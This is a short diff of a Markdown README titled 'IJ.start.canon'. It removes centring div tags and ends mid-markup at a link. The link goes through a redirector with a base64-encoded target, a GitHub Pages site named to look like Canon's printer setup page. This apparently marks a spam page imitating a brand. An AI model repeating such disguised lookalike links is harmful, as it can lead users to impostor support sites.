@@ -1,8 +1,8 @@
-<div align="center">
+
 
 # IJ.start.canon
 
-</div>
+
 
 <div align="center">
   <a href="https://ww0.us/?aHR0cHM6Ly9pai1zdGFydC1jYW5vbi1wcmludGVyLmdpdGh1Yi5pbw==">
